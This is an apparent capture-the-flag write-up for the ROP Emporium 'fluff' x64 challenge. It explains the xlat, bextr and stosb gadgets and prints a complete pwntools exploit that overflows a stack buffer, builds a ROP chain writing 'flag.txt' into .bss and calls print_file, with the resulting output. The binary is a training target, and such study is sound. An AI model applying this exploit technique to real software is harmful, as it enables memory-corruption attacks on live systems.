---
title: "Fluff (x64)"
date: "2025-08-11"
tags: ["RopEmporium", "ROP"]
---

This challenge is basically the same as [write4](https://ub1cu0.gitbook.io/pwn-writeups/ropemporium/4.-write4-x86_64) but with one difference. The difference is that we have no rop gadget doing a `mov DWORD ptr`, so we cannot store `flag.txt` in the `.bss`. How do we do it then? Well, if we look at the functions in the binary we can see the following:

```c
0000000000400628 <questionableGadgets>:
  400628:  d7                    xlat   BYTE PTR ds:[rbx]
  400629:  c3                    ret
  40062a:  5a                    pop    rdx
  40062b:  59                    pop    rcx
  40062c:  48 81 c1 f2 3e 00 00  add    rcx,0x3ef2
  400633:  c4 e2 e8 f7 d9        bextr  rbx,rcx,rdx
  400638:  c3                    ret
  400639:  aa                    stos   BYTE PTR es:[rdi],al
  40063a:  c3                    ret
  40063b:  0f 1f 44 00 00        nop    DWORD PTR [rax+rax*1+0x0]
```

Using only what is inside this function we can get the string `flag.txt` into the `.bss` memory segment like this:

Let's focus on the 3 gadgets we are going to need:

```c
400628:  d7                    xlat   BYTE PTR ds:[rbx]
. . .
400633:  c4 e2 e8 f7 d9        bextr  rbx,rcx,rdx
. . .
400639:  aa                    stos   BYTE PTR es:[rdi],al
```

What is each one?

* `xlat`: uses `AL` as an index with `RBX` as the base and stores the result in `AL`, that is: `AL = RBX[AL]`
* `stosb` writes `AL` to `RDI` and then increments `RDI`
* `bextr rbx, rcx, rdx`: extracts a number of bits from `RCX` into `RBX`, using `RDX` to say how many bits and at which bit it starts.

How would we use it and in what order? This is the way we would drive these gadgets:

```c
1. Con bextr guardamos flag.txt en el rbp bit a bit
2. Con xlat y stosb pasamos flag.txt: RBX --> AL --> RDI
```

We are going to need this data:

```python
bss = exe.bss() # Primera dirección del BSS (asumimos que está vacío)
xlat = exe.symbols['questionableGadgets'] # Dirección a la función questionableGadgets
pop_rdx_rcx_add_bextr = 0x40062a # pop rdx; pop rcx; add rcx, 0x3ef2; bextr  rbx,rcx,rdx; ret
stos = 0x400639 # stos   BYTE PTR es:[rdi],al; ret
pop_rdi = 0x004006a3 # pop rdi; ret
print_file = exe.plt['print_file'] #Dirección de la función print_file en la  plt
al_antiguo = 0xb # Antes de llegar a nuestro rop el programa tiene esto en al. Se puede ver en GDB
blob = read(exe.path) # Con esto blob contiene todos los datos del binario y puede buscar caracteres en él.
flag = b'flag.txt'
```

Now that we have all the data we can move on to the solve:

```python
#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("fluff")
libc = ELF("libfluff.so")

context.binary = exe
context.terminal = ['kitty']
gdb_script = f'''
continue
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
        return r
    return remote("addr", 1337)

def main():
    io = conn()
    offset = 40  # hasta rip

    bss = exe.bss()
    xlat = exe.symbols['questionableGadgets']
    pop_rdx_rcx_add_bextr = 0x40062a
    stos = 0x400639
    pop_rdi = 0x004006a3
    print_file = exe.plt['print_file']

    al_antiguo = 0xb  # esto es lo que ya hay en al antes de llegar a nuestro rop
    blob = read(exe.path)
    flag = b'flag.txt'

    chain = b""

    for a, b in enumerate(flag):
        idx = blob.find(bytes([b]))
        assert idx != -1, log.failure(f"No hay ese char")
        
        # hay que restar lo que ya había en AL y el +0x3ef2 que mete el gadget
        rcx_val = exe.address + idx - al_antiguo - 0x3ef2

        chain += flat(
            pop_rdx_rcx_add_bextr,
            0x4000,         # rdx random grande para que copie todo
            rcx_val,        # rcx calculado
            xlat,           # mete el char en AL
            pop_rdi, bss + a,
            stos            # escribe el char en .bss
        )
        
        # ahora AL vale el último char que pillamos, hay que guardarlo para la siguiente vuelta
        al_antiguo = b

    # llamar a print_file con la dirección donde metimos flag.txt
    chain += flat(pop_rdi, bss, print_file)

    payload = flat(
        b"A" * offset,
        chain
    )

    io.sendlineafter(b'> ', payload)
    io.interactive()

if __name__ == "__main__":
    main()

```

```python
[*] Switching to interactive mode
Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
```

It works!
